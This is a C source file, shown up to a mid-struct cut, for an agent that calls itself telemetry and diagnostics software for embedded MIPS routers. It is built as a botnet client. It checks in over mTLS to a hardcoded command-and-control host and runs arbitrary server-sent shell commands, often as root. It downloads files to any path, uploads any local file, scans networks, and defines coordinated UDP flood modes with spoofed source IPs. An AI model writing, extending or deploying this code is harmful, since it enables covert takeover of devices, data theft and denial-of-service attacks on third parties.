/*
 * m12 telemetry + diagnostics agent for embedded MIPS Linux (BusyBox).
 * mTLS client on mbedTLS 3.x (tested against 3.6 LTS), statically linkable.
 *
 * Each run: open an mTLS connection to the ingest listener, POST telemetry to
 * /ingest, and read back any commands queued for THIS node (the server keys them
 * by our certificate CN). For each command: run it with popen(), capture output,
 * and POST the result to /output. Loops forever, checking in every 60 seconds
 * by default.
 *
 *   usage: m12-agent [interval] [status]
 *          interval     seconds between check-ins (default 60)
 *          status       healthy|scanning|offline (default healthy)
 *
 * SECURITY: /output and the command set are only ever exchanged over this mTLS
 * channel, and the server will only hand this agent commands addressed to its own
 * cert CN. Commands run as whatever user this process runs as (often root on
 * embedded devices) — enable the server-side allowlist if you don't want full shell.
 *
 * Build: see client/Makefile  (make CROSS=mips-linux-gnu-).
 */
#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <dirent.h>
#include <sys/wait.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdatomic.h>

#include "mbedtls/ssl.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/x509_crt.h"
#include "mbedtls/pk.h"
#include "mbedtls/error.h"
#include "mbedtls/sha256.h"

#include "jsmn.h"
#include "discovery.h"
#include "udp_sender.h"
#include "tcp_sender.h"
#include <pthread.h>

/* CA, client cert, and private key are always compiled in (embedded_certs.h).
 * The binary is self-contained — no cert files needed on the device.
 * The embedded private key IS the node's identity, so the binary itself
 * is a per-node secret: keep it 0700, never share or publish it. */
#include "embedded_certs.h"

/* ---- configuration ----
 * The values below are compile-time fallback defaults.  Override at runtime
 * (later sources win):
 *   1. config file: key=value lines (see CONFIG_PATH / $M12_CONFIG)
 *   2. environment: $M12_HOST, $M12_PORT, $M12_REGION, $M12_CA/$M12_CERT/$M12_KEY
 * load_config() resolves them at startup.
 */
#ifndef SERVER_HOST
#define SERVER_HOST "ingest.zki.lol"
#endif
#ifndef SERVER_PORT
#define SERVER_PORT "8802"
#endif
#ifndef NODE_REGION
#define NODE_REGION "LAN"
#endif
/* Node id reported to the server. Empty by default: the agent then derives a
 * stable id from this device's MAC (e.g. "node-001122334455"), so one identical
 * fleet binary still reports as a distinct node per router. Override with a
 * fixed id via the `node` config key or $M12_NODE. */
#ifndef NODE_ID
#define NODE_ID ""
#endif
#ifndef CA_PATH
#define CA_PATH   "ca.crt"
#endif
#ifndef CERT_PATH
#define CERT_PATH "node.crt"
#endif
#ifndef KEY_PATH
#define KEY_PATH  "node.key"
#endif
/* Optional single identity file holding this node's cert AND private key
 * (concatenated PEM). When set/non-empty it is used for BOTH the cert and the
 * key, so a device needs just one file instead of node.crt + node.key. Empty by
 * default (keeps the classic two-file behaviour); fleet builds bake in
 * -DIDENTITY_PATH=\"node.pem\". */
#ifndef IDENTITY_PATH
#define IDENTITY_PATH ""
#endif
/* Default config-file path used when $M12_CONFIG is unset. */
#ifndef CONFIG_PATH
#define CONFIG_PATH "m12-agent.conf"
#endif

#define M12_PROTO_VERSION 2

#define HTTP_PATH        "/ingest"
#define HTTP_OUTPUT_PATH "/output"
#define HTTP_HEARTBEAT_PATH "/heartbeat"
/* ------------------------------------------------------------- */

/* Resolved endpoint/paths, filled by load_config() before any connection. */
#define MAX_C2_ADDRS 8

typedef struct { char host[128]; char port[16]; } c2_addr_t;

static struct {
  char host[128];       /* active host (points into addrs[addr_idx]) */
  char port[16];        /* active port */
  char region[32];
  char ca[256];
  char cert[256];
  char key[256];
  char identity[256];   /* one PEM file = cert + key; used for both when set */
  char node[80];        /* reported node id; auto-derived from MAC when empty */
  c2_addr_t addrs[MAX_C2_ADDRS];
  int addr_count;
  int addr_idx;
} g_cfg;

#define RESP_CAP 16384   /* ingest response (telemetry ack + commands) */
#define OUT_CAP  8192    /* captured command output (truncated past this) */
#define ESC_CAP  16384   /* JSON-escaped output */
#define BODY_CAP 20480   /* /output request body */
#define REQ_CAP  24576   /* full HTTP request (headers + body) */
#define MAX_TOKS 512     /* jsmn token budget */
#define FILE_MAX_SIZE (4 * 1024 * 1024)

static mbedtls_entropy_context g_entropy;
static mbedtls_ctr_drbg_context g_ctr_drbg;
static mbedtls_x509_crt g_cacert;
static mbedtls_x509_crt g_clicert;
static mbedtls_pk_context g_pkey;
static mbedtls_ssl_config g_conf;
static mbedtls_ssl_session g_session;
static int g_session_valid;

static char g_req[REQ_CAP];

static void sleep_jitter(int base) {
  double factor = 0.7 + ((double)(rand() % 1000) / 1000.0) * 0.6;
  int s = (int)(base * factor);
  if (s < 1) s = 1;
  sleep(s);
}

static void emit_err(const char *what, int ret) {
  char buf[128];
  mbedtls_strerror(ret, buf, sizeof(buf));
  fprintf(stderr, "%s: -0x%04x %s\n", what, (unsigned)-ret, buf);
}

/* ---------- node metrics (BusyBox /proc) ---------- */

static int read_cpu_totals(unsigned long long *idle, unsigned long long *total) {
  FILE *f = fopen("/proc/stat", "r");
  if (!f) return -1;
  unsigned long long u = 0, n = 0, s = 0, i = 0, io = 0, irq = 0, sq = 0, st = 0;
  int got = fscanf(f, "cpu %llu %llu %llu %llu %llu %llu %llu %llu", &u, &n, &s, &i, &io, &irq, &sq, &st);
  fclose(f);
  if (got < 4) return -1;
  *idle = i + io;
  *total = u + n + s + i + io + irq + sq + st;
  return 0;
}

static double cpu_percent(void) {
  unsigned long long idle1, total1, idle2, total2;
  if (read_cpu_totals(&idle1, &total1) != 0) return 0.0;
  struct timespec ts = { 0, 200 * 1000 * 1000 };
  nanosleep(&ts, NULL);
  if (read_cpu_totals(&idle2, &total2) != 0) return 0.0;
  unsigned long long dt = total2 - total1, di = idle2 - idle1;
  return dt ? 100.0 * (double)(dt - di) / (double)dt : 0.0;
}

static double mem_percent(void) {
  FILE *f = fopen("/proc/meminfo", "r");
  if (!f) return 0.0;
  char line[128];
  unsigned long total = 0, avail = 0, freek = 0;
  while (fgets(line, sizeof(line), f)) {
    sscanf(line, "MemTotal: %lu kB", &total);
    sscanf(line, "MemAvailable: %lu kB", &avail);
    sscanf(line, "MemFree: %lu kB", &freek);
  }
  fclose(f);
  if (!total) return 0.0;
  unsigned long used = total - (avail ? avail : freek);
  return 100.0 * (double)used / (double)total;
}

/* ---------- JSON helpers ---------- */

static int tok_eq(const char *json, const jsmntok_t *t, const char *s) {
  int len = t->end - t->start;
  return t->type == JSMN_STRING && (int)strlen(s) == len && strncmp(json + t->start, s, len) == 0;
}

static size_t json_escape(const char *s, size_t len, char *dst, size_t cap) {
  size_t o = 0;
  for (size_t i = 0; i < len && o + 7 < cap; i++) {
    unsigned char c = (unsigned char)s[i];
    switch (c) {
    case '"':  dst[o++] = '\\'; dst[o++] = '"'; break;
    case '\\': dst[o++] = '\\'; dst[o++] = '\\'; break;
    case '\n': dst[o++] = '\\'; dst[o++] = 'n'; break;
    case '\r': dst[o++] = '\\'; dst[o++] = 'r'; break;
    case '\t': dst[o++] = '\\'; dst[o++] = 't'; break;
    default:
      if (c < 0x20) o += (size_t)snprintf(dst + o, cap - o, "\\u%04x", c);
      else dst[o++] = (char)c;
    }
  }
  dst[o] = 0;
  return o;
}

static size_t json_unescape(const char *s, size_t len, char *dst, size_t cap) {
  size_t o = 0;
  for (size_t i = 0; i < len && o + 1 < cap; i++) {
    if (s[i] == '\\' && i + 1 < len) {
      i++;
      switch (s[i]) {
      case 'n': dst[o++] = '\n'; break;
      case 't': dst[o++] = '\t'; break;
      case 'r': dst[o++] = '\r'; break;
      case 'b': dst[o++] = '\b'; break;
      case 'f': dst[o++] = '\f'; break;
      case '/': dst[o++] = '/'; break;
      case '"': dst[o++] = '"'; break;
      case '\\': dst[o++] = '\\'; break;
      case 'u': if (i + 4 < len) { i += 4; dst[o++] = '?'; } break; /* non-ASCII unicode not needed for commands */
      default: dst[o++] = s[i];
      }
    } else {
      dst[o++] = s[i];
    }
  }
  dst[o] = 0;
  return o;
}

/* ---------- command execution ---------- */

static int run_command(const char *cmd, char *out, size_t cap, int *exit_code) {
  FILE *fp = popen(cmd, "r");
  if (!fp) {
    snprintf(out, cap, "popen failed: %s", strerror(errno));
    *exit_code = -1;
    return -1;
  }
  size_t n = 0, r;
  while (n < cap - 1 && (r = fread(out + n, 1, cap - 1 - n, fp)) > 0) n += r;
  out[n] = 0;
  /* drain any remaining output so pclose() doesn't block on a full pipe */
  char tmp[1024];
  while (fread(tmp, 1, sizeof(tmp), fp) > 0) { /* discard */ }
  int rc = pclose(fp);
  *exit_code = (rc == -1) ? -1 : (WIFEXITED(rc) ? WEXITSTATUS(rc) : -1);
  return 0;
}

/* ---------- TLS ---------- */

/* Read a whole file into a malloc'd buffer. Returns bytes read, 0 on failure.
   The buffer is NUL-terminated (PEM needs it; harmless for DER). */
static size_t read_file(const char *path, unsigned char **out) {
  FILE *f = fopen(path, "rb");
  if (!f) return 0;
  fseek(f, 0, SEEK_END);
  long len = ftell(f);
  if (len <= 0) { fclose(f); return 0; }
  fseek(f, 0, SEEK_SET);
  *out = malloc((size_t)len + 1);
  if (!*out) { fclose(f); return 0; }
  size_t n = fread(*out, 1, (size_t)len, f);
  fclose(f);
  (*out)[n] = 0;
  return n + 1; /* include NUL — mbedtls_x509_crt_parse expects it for PEM */
}

/* Custom entropy source: read ONLY /dev/urandom.  Bypasses mbedtls's default
   platform poll which may try getrandom() (ENOSYS on kernel <3.17) or open
   /dev/random (missing on some Broadcom/EcoNet firmware). */
static int urandom_poll(void *data, unsigned char *output, size_t len, size_t *olen) {
  static int fd = -1;
  (void)data;
  *olen = 0;
  if (fd < 0 && (fd = open("/dev/urandom", O_RDONLY)) < 0)
    return MBEDTLS_ERR_ENTROPY_SOURCE_FAILED;
  size_t off = 0;
  while (off < len) {
    ssize_t n = read(fd, output + off, len - off);
    if (n <= 0) {
      if (n < 0 && errno == EINTR) continue;
      return MBEDTLS_ERR_ENTROPY_SOURCE_FAILED;
    }
    off += (size_t)n;
  }
  *olen = len;
  return 0;
}

static int setup_tls(void) {
  int ret;
  const char *pers = "m12-agent";
  mbedtls_entropy_init(&g_entropy);
  mbedtls_entropy_add_source(&g_entropy, urandom_poll, NULL, 32,
                             MBEDTLS_ENTROPY_SOURCE_STRONG);
  mbedtls_ctr_drbg_init(&g_ctr_drbg);
  mbedtls_x509_crt_init(&g_cacert);
  mbedtls_x509_crt_init(&g_clicert);
  mbedtls_pk_init(&g_pkey);
  mbedtls_ssl_config_init(&g_conf);
  mbedtls_ssl_session_init(&g_session);
  g_session_valid = 0;

  if ((ret = mbedtls_ctr_drbg_seed(&g_ctr_drbg, mbedtls_entropy_func, &g_entropy, (const unsigned char *)pers, strlen(pers))) != 0) { emit_err("drbg_seed", ret); return -1; }
  /* --- CA (trust anchor) — compiled-in PEM --- */
  if ((ret = mbedtls_x509_crt_parse(&g_cacert, embedded_ca, embedded_ca_len)) != 0) { emit_err("embedded ca", ret); return -1; }
  /* --- this node's cert + key (identity) — compiled-in PEM --- */
  if ((ret = mbedtls_x509_crt_parse(&g_clicert, embedded_cert, embedded_cert_len)) != 0) { emit_err("embedded cert", ret); return -1; }
  if ((ret = mbedtls_pk_parse_key(&g_pkey, embedded_key, embedded_key_len, NULL, 0, mbedtls_ctr_drbg_random, &g_ctr_drbg)) != 0) { emit_err("embedded key", ret); return -1; }
  if ((ret = mbedtls_ssl_config_defaults(&g_conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT)) != 0) { emit_err("config_defaults", ret); return -1; }
  mbedtls_ssl_conf_authmode(&g_conf, MBEDTLS_SSL_VERIFY_REQUIRED);
  mbedtls_ssl_conf_ca_chain(&g_conf, &g_cacert, NULL);
  mbedtls_ssl_conf_rng(&g_conf, mbedtls_ctr_drbg_random, &g_ctr_drbg);
  mbedtls_ssl_conf_min_tls_version(&g_conf, MBEDTLS_SSL_VERSION_TLS1_2);
  if ((ret = mbedtls_ssl_conf_own_cert(&g_conf, &g_clicert, &g_pkey)) != 0) { emit_err("own_cert", ret); return -1; }
  return 0;
}

static void cleanup_tls(void) {
  mbedtls_ssl_session_free(&g_session);
  g_session_valid = 0;
  mbedtls_ssl_config_free(&g_conf);
  mbedtls_x509_crt_free(&g_cacert);
  mbedtls_x509_crt_free(&g_clicert);
  mbedtls_pk_free(&g_pkey);
  mbedtls_ctr_drbg_free(&g_ctr_drbg);
  mbedtls_entropy_free(&g_entropy);
}

/* --- inline POSIX socket I/O callbacks for mbedtls_ssl_set_bio --- */

static int net_send(void *ctx, const unsigned char *buf, size_t len) {
  ssize_t r = send(*(int *)ctx, buf, len, 0);
  if (r < 0) return (errno == EAGAIN || errno == EINTR) ? MBEDTLS_ERR_SSL_WANT_WRITE : -1;
  return (int)r;
}

static int net_recv(void *ctx, unsigned char *buf, size_t len) {
  ssize_t r = recv(*(int *)ctx, buf, len, 0);
  if (r < 0) return (errno == EAGAIN || errno == EINTR) ? MBEDTLS_ERR_SSL_WANT_READ : -1;
  return (int)r;
}

static int tcp_connect(const char *host, const char *port) {
  struct addrinfo hints = { .ai_socktype = SOCK_STREAM }, *res, *rp;
  if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
  int fd = -1;
  for (rp = res; rp; rp = rp->ai_next) {
    fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (fd < 0) continue;
    if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
    close(fd); fd = -1;
  }
  freeaddrinfo(res);
  return fd;
}

/* One request/response over a fresh mTLS connection. Returns the HTTP status
 * code (resp holds the full response, NUL-terminated), or -1 on failure. */
static int https_request(const char *path, const char *body, char *resp, size_t resp_cap) {
  int ret, status = -1;
  int fd = -1;
  mbedtls_ssl_context ssl;
  mbedtls_ssl_init(&ssl);

  fd = tcp_connect(g_cfg.host, g_cfg.port);
  if (fd < 0) { fprintf(stderr, "connect: %s:%s: %s\n", g_cfg.host, g_cfg.port, strerror(errno)); goto done; }
  if ((ret = mbedtls_ssl_setup(&ssl, &g_conf)) != 0) { emit_err("ssl_setup", ret); goto done; }
  if ((ret = mbedtls_ssl_set_hostname(&ssl, g_cfg.host)) != 0) { emit_err("set_hostname", ret); goto done; }
  if (g_session_valid) mbedtls_ssl_set_session(&ssl, &g_session);
  mbedtls_ssl_set_bio(&ssl, &fd, net_send, net_recv, NULL);

  while ((ret = mbedtls_ssl_handshake(&ssl)) != 0) {
    if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) { emit_err("handshake", ret); goto done; }
  }
  /* Save session for resumption on next connection */
  mbedtls_ssl_session_free(&g_session);
  mbedtls_ssl_session_init(&g_session);
  if (mbedtls_ssl_get_session(&ssl, &g_session) == 0) g_session_valid = 1;

  int rlen = snprintf(g_req, sizeof(g_req),
                      "POST %s HTTP/1.1\r\nHost: %s:%s\r\nContent-Type: application/json\r\n"
                      "Content-Length: %d\r\nConnection: close\r\n\r\n%s",
                      path, g_cfg.host, g_cfg.port, (int)strlen(body), body);
  if (rlen < 0 || rlen >= (int)sizeof(g_req)) { fprintf(stderr, "request too large\n"); goto notify; }

  for (int w = 0; w < rlen; ) {
    ret = mbedtls_ssl_write(&ssl, (const unsigned char *)g_req + w, rlen - w);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret <= 0) { emit_err("ssl_write", ret); goto notify; }
    w += ret;
  }

  size_t n = 0;
  for (;;) {
    ret = mbedtls_ssl_read(&ssl, (unsigned char *)resp + n, resp_cap - 1 - n);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
    if (ret < 0) { emit_err("ssl_read", ret); break; }
    n += ret;
    if (n >= resp_cap - 1) break;
  }
  resp[n] = 0;
  if (n >= 12) sscanf(resp + 9, "%d", &status);

notify:
  mbedtls_ssl_close_notify(&ssl);
done:
  mbedtls_ssl_free(&ssl);
  if (fd >= 0) close(fd);
  return status;
}

static const char *http_body(const char *resp) {
  const char *b = strstr(resp, "\r\n\r\n");
  return b ? b + 4 : resp;
}

static void sha256_hex(const unsigned char *data, size_t len, char *hex) {
  unsigned char hash[32];
  mbedtls_sha256(data, len, hash, 0);
  for (int i = 0; i < 32; i++) sprintf(hex + i * 2, "%02x", hash[i]);
  hex[64] = 0;
}

static int https_get_file(const char *path, unsigned char **out_data, size_t *out_len) {
  int ret, status = -1;
  int fd = -1;
  unsigned char *buf = NULL;
  mbedtls_ssl_context ssl;
  mbedtls_ssl_init(&ssl);
  *out_data = NULL;
  *out_len = 0;

  fd = tcp_connect(g_cfg.host, g_cfg.port);
  if (fd < 0) goto done;
  if ((ret = mbedtls_ssl_setup(&ssl, &g_conf)) != 0) goto done;
  if ((ret = mbedtls_ssl_set_hostname(&ssl, g_cfg.host)) != 0) goto done;
  if (g_session_valid) mbedtls_ssl_set_session(&ssl, &g_session);
  mbedtls_ssl_set_bio(&ssl, &fd, net_send, net_recv, NULL);
  while ((ret = mbedtls_ssl_handshake(&ssl)) != 0)
    if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) goto done;
  mbedtls_ssl_session_free(&g_session);
  mbedtls_ssl_session_init(&g_session);
  if (mbedtls_ssl_get_session(&ssl, &g_session) == 0) g_session_valid = 1;

  char reqbuf[512];
  int rlen = snprintf(reqbuf, sizeof(reqbuf),
    "GET %s HTTP/1.1\r\nHost: %s:%s\r\nConnection: close\r\n\r\n",
    path, g_cfg.host, g_cfg.port);
  if (rlen < 0 || rlen >= (int)sizeof(reqbuf)) goto notify;

  for (int w = 0; w < rlen; ) {
    ret = mbedtls_ssl_write(&ssl, (const unsigned char *)reqbuf + w, rlen - w);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret <= 0) goto notify;
    w += ret;
  }

  size_t cap = 16384, n = 0;
  buf = malloc(cap);
  if (!buf) goto notify;
  for (;;) {
    if (n + 4096 > cap) {
      size_t nc = cap * 2;
      if (nc > FILE_MAX_SIZE + 8192) { free(buf); buf = NULL; goto notify; }
      unsigned char *nb = realloc(buf, nc);
      if (!nb) { free(buf); buf = NULL; goto notify; }
      buf = nb; cap = nc;
    }
    ret = mbedtls_ssl_read(&ssl, buf + n, cap - n);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
    if (ret < 0) break;
    n += ret;
  }
  if (n < 12 || !buf) { free(buf); buf = NULL; goto notify; }
  sscanf((char *)buf + 9, "%d", &status);
  if (status == 200) {
    char *hdr_end = strstr((char *)buf, "\r\n\r\n");
    if (hdr_end) {
      size_t hdr_len = (size_t)(hdr_end - (char *)buf) + 4;
      *out_len = n - hdr_len;
      *out_data = malloc(*out_len);
      if (*out_data) memcpy(*out_data, buf + hdr_len, *out_len);
      else { *out_len = 0; status = -1; }
    }
  }
  free(buf); buf = NULL;

notify:
  mbedtls_ssl_close_notify(&ssl);
done:
  mbedtls_ssl_free(&ssl);
  if (fd >= 0) close(fd);
  return status;
}

static int https_post_file(const char *path, const unsigned char *data, size_t data_len) {
  int ret, status = -1;
  int fd = -1;
  mbedtls_ssl_context ssl;
  mbedtls_ssl_init(&ssl);

  fd = tcp_connect(g_cfg.host, g_cfg.port);
  if (fd < 0) goto done;
  if ((ret = mbedtls_ssl_setup(&ssl, &g_conf)) != 0) goto done;
  if ((ret = mbedtls_ssl_set_hostname(&ssl, g_cfg.host)) != 0) goto done;
  if (g_session_valid) mbedtls_ssl_set_session(&ssl, &g_session);
  mbedtls_ssl_set_bio(&ssl, &fd, net_send, net_recv, NULL);
  while ((ret = mbedtls_ssl_handshake(&ssl)) != 0)
    if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) goto done;
  mbedtls_ssl_session_free(&g_session);
  mbedtls_ssl_session_init(&g_session);
  if (mbedtls_ssl_get_session(&ssl, &g_session) == 0) g_session_valid = 1;

  char hdr[512];
  int hlen = snprintf(hdr, sizeof(hdr),
    "POST %s HTTP/1.1\r\nHost: %s:%s\r\nContent-Type: application/octet-stream\r\n"
    "Content-Length: %d\r\nConnection: close\r\n\r\n",
    path, g_cfg.host, g_cfg.port, (int)data_len);
  if (hlen < 0 || hlen >= (int)sizeof(hdr)) goto notify;
  for (int w = 0; w < hlen; ) {
    ret = mbedtls_ssl_write(&ssl, (const unsigned char *)hdr + w, hlen - w);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret <= 0) goto notify;
    w += ret;
  }
  for (size_t w = 0; w < data_len; ) {
    size_t chunk = data_len - w;
    if (chunk > 8192) chunk = 8192;
    ret = mbedtls_ssl_write(&ssl, data + w, chunk);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret <= 0) goto notify;
    w += ret;
  }

  char resp[512];
  size_t n = 0;
  for (;;) {
    ret = mbedtls_ssl_read(&ssl, (unsigned char *)resp + n, sizeof(resp) - 1 - n);
    if (ret == MBEDTLS_ERR_SSL_WANT_READ || ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
    if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
    if (ret < 0) break;
    n += ret;
    if (n >= sizeof(resp) - 1) break;
  }
  resp[n] = 0;
  if (n >= 12) sscanf(resp + 9, "%d", &status);

notify:
  mbedtls_ssl_close_notify(&ssl);
done:
  mbedtls_ssl_free(&ssl);
  if (fd >= 0) close(fd);
  return status;
}

static int handle_file_push(const char *json_str, int json_len) {
  jsmn_parser p;
  jsmn_init(&p);
  jsmntok_t toks[32];
  int n = jsmn_parse(&p, json_str, json_len, toks, 32);
  if (n < 0) return -1;

  const char *fid = NULL, *dp = NULL, *sha = NULL;
  int fl = 0, dl = 0, sl = 0;
  for (int i = 0; i < n - 1; i++) {
    if (tok_eq(json_str, &toks[i], "fileId") && toks[i+1].type == JSMN_STRING)
      { fid = json_str + toks[i+1].start; fl = toks[i+1].end - toks[i+1].start; }
    else if (tok_eq(json_str, &toks[i], "path") && toks[i+1].type == JSMN_STRING)
      { dp = json_str + toks[i+1].start; dl = toks[i+1].end - toks[i+1].start; }
    else if (tok_eq(json_str, &toks[i], "sha256") && toks[i+1].type == JSMN_STRING)
      { sha = json_str + toks[i+1].start; sl = toks[i+1].end - toks[i+1].start; }
  }
  if (!fid || !dp || !sha || fl > 32 || dl > 512 || sl != 64) return -1;

  char fidbuf[33], dpath[513], expected[65];
  memcpy(fidbuf, fid, fl); fidbuf[fl] = 0;
  memcpy(dpath, dp, dl); dpath[dl] = 0;
  memcpy(expected, sha, 64); expected[64] = 0;

  char url[128];
  snprintf(url, sizeof(url), "/file/%s", fidbuf);
  unsigned char *data = NULL;
  size_t data_len = 0;
  int st = https_get_file(url, &data, &data_len);
  if (st != 200 || !data) {
    fprintf(stderr, "file_push: download failed HTTP %d\n", st);
    free(data);
    return -1;
  }

  char actual[65];
  sha256_hex(data, data_len, actual);
  if (strcmp(actual, expected) != 0) {
    fprintf(stderr, "file_push: SHA-256 mismatch\n");
    free(data);
    return -1;
  }

  char tmppath[520];
  snprintf(tmppath, sizeof(tmppath), "%s.m12tmp", dpath);
  int wfd = open(tmppath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (wfd < 0) { fprintf(stderr, "file_push: open %s: %s\n", tmppath, strerror(errno)); free(data); return -1; }
  size_t wr = 0;
  while (wr < data_len) {
    ssize_t w = write(wfd, data + wr, data_len - wr);
    if (w <= 0) { if (w < 0 && errno == EINTR) continue; close(wfd); unlink(tmppath); free(data); return -1; }
    wr += w;
  }
  close(wfd);
  free(data);

  if (rename(tmppath, dpath) != 0) { fprintf(stderr, "file_push: rename: %s\n", strerror(errno)); unlink(tmppath); return -1; }
  fprintf(stderr, "file_push: %s (%zu bytes) ok\n", dpath, data_len);
  return 0;
}

static int handle_file_pull(const char *json_str, int json_len) {
  jsmn_parser p;
  jsmn_init(&p);
  jsmntok_t toks[32];
  int n = jsmn_parse(&p, json_str, json_len, toks, 32);
  if (n < 0) return -1;

  const char *fid = NULL, *rp = NULL;
  int fl = 0, rl = 0;
  for (int i = 0; i < n - 1; i++) {
    if (tok_eq(json_str, &toks[i], "fileId") && toks[i+1].type == JSMN_STRING)
      { fid = json_str + toks[i+1].start; fl = toks[i+1].end - toks[i+1].start; }
    else if (tok_eq(json_str, &toks[i], "path") && toks[i+1].type == JSMN_STRING)
      { rp = json_str + toks[i+1].start; rl = toks[i+1].end - toks[i+1].start; }
  }
  if (!fid || !rp || fl > 32 || rl > 512) return -1;

  char fidbuf[33], rpath[513];
  memcpy(fidbuf, fid, fl); fidbuf[fl] = 0;
  memcpy(rpath, rp, rl); rpath[rl] = 0;

  int rfd = open(rpath, O_RDONLY);
  if (rfd < 0) { fprintf(stderr, "file_pull: open %s: %s\n", rpath, strerror(errno)); return -1; }
  off_t fsize = lseek(rfd, 0, SEEK_END);
  if (fsize < 0 || fsize > FILE_MAX_SIZE) { close(rfd); return -1; }
  lseek(rfd, 0, SEEK_SET);

  unsigned char *data = malloc((size_t)fsize);
  if (!data) { close(rfd); return -1; }
  size_t total = 0;
  while (total < (size_t)fsize) {
    ssize_t r = read(rfd, data + total, (size_t)fsize - total);
    if (r <= 0) { if (r < 0 && errno == EINTR) continue; break; }
    total += r;
  }
  close(rfd);

  char url[128];
  snprintf(url, sizeof(url), "/file/%s", fidbuf);
  int st = https_post_file(url, data, total);
  free(data);
  if (st != 200) { fprintf(stderr, "file_pull: upload failed HTTP %d\n", st); return -1; }
  fprintf(stderr, "file_pull: %s (%zu bytes) ok\n", rpath, total);
  return 0;
}

/* ---------- discovery handler ---------- */

static int handle_discovery(const char *json_str, int json_len, char *out, size_t out_cap) {
  jsmn_parser p;
  jsmn_init(&p);
  jsmntok_t toks[128];
  int n = jsmn_parse(&p, json_str, json_len, toks, 128);
  if (n < 0) return -1;

  char start_ip[64] = {0}, end_ip[64] = {0};
  uint16_t ports[DISC_MAX_PORTS];
  int nports = 0;
  int timeout_ms = 1000;

  for (int i = 0; i < n - 1; i++) {
    if (tok_eq(json_str, &toks[i], "startIp") && toks[i+1].type == JSMN_STRING) {
      int l = toks[i+1].end - toks[i+1].start;
      if (l < (int)sizeof(start_ip)) { memcpy(start_ip, json_str + toks[i+1].start, l); start_ip[l] = 0; }
    } else if (tok_eq(json_str, &toks[i], "endIp") && toks[i+1].type == JSMN_STRING) {
      int l = toks[i+1].end - toks[i+1].start;
      if (l < (int)sizeof(end_ip)) { memcpy(end_ip, json_str + toks[i+1].start, l); end_ip[l] = 0; }
    } else if (tok_eq(json_str, &toks[i], "timeout") && toks[i+1].type == JSMN_PRIMITIVE) {
      char buf[16]; int l = toks[i+1].end - toks[i+1].start;
      if (l < (int)sizeof(buf)) { memcpy(buf, json_str + toks[i+1].start, l); buf[l] = 0; timeout_ms = atoi(buf); }
    } else if (tok_eq(json_str, &toks[i], "ports") && toks[i+1].type == JSMN_ARRAY) {
      int arr = i + 1, cnt = toks[arr].size;
      int t = arr + 1;
      for (int j = 0; j < cnt && nports < DISC_MAX_PORTS; j++, t++) {
        char buf[8]; int l = toks[t].end - toks[t].start;
        if (l < (int)sizeof(buf)) { memcpy(buf, json_str + toks[t].start, l); buf[l] = 0; ports[nports++] = (uint16_t)atoi(buf); }
      }
    }
  }

  if (!start_ip[0] || !end_ip[0] || nports == 0) {
    snprintf(out, out_cap, "discovery: missing startIp, endIp, or ports");
    return -1;
  }

  disc_report_t report;
  if (discovery_scan(start_ip, end_ip, ports, nports, timeout_ms, &report) != 0) {
    snprintf(out, out_cap, "discovery: invalid IP range");
    return -1;
  }
  discovery_format(&report, out, out_cap);
  return 0;
}

/* ---------- load test handler ---------- */

/* Mode IDs — open dispatch table; protocol builders (udmux/raknet) add entries
 * here and in load_modes[] without touching the send loop. */
#define MODE_UDP_RAW         0
#define MODE_UDP_FLOW_SPRAY  1
#define MODE_UDP_SPOOF_FLOW  2
#define MODE_MIXED           3
#define MODE_COUNT           4

#define MAX_PHASES 16

typedef struct {
  int mode;
  double duration_s;
  double pps;
  double bps;
  double ramp_s;
} load_phase_t;

typedef struct load_thread_arg load_thread_arg_t;
typedef void (*load_mode_fn)(load_thread_arg_t *);

struct load_thread_arg {
  int thread_id;
  char target[64];
  uint16_t port;
  double duration;
  int proto_tcp;          /* 1=TCP, 0=UDP (for udp_raw + tcp path) */
  int mode;               /* MODE_* constant */
  int pattern;            /* 0=default, 1=zeros, 2=rand, 3=seq */
  uint16_t src_port;      /* 0 = ephemeral */
  double pps;
  double bps;
  rate_limiter_t *shared_rl;

  /* sequential port walk (controller-assigned disjoint window) */
  uint16_t port_base;     /* first port in this agent's window */
  uint16_t port_span;     /* window width */
  uint16_t port_stride;   /* fleet_size * threads (walk step) */

  /* spoof mode: source IP pool */
  uint32_t *src_ips;      /* array of network-order IPv4 addrs */
  int src_ip_count;
  int spoof_enabled;

  /* coordinated start */
  uint64_t start_mono_ns; /* 0 = start immediately */

  /* phase campaign (NULL/0 = single-phase run using top-level mode/duration/pps/bps) */
  load_phase_t *phases;
  int phase_count;

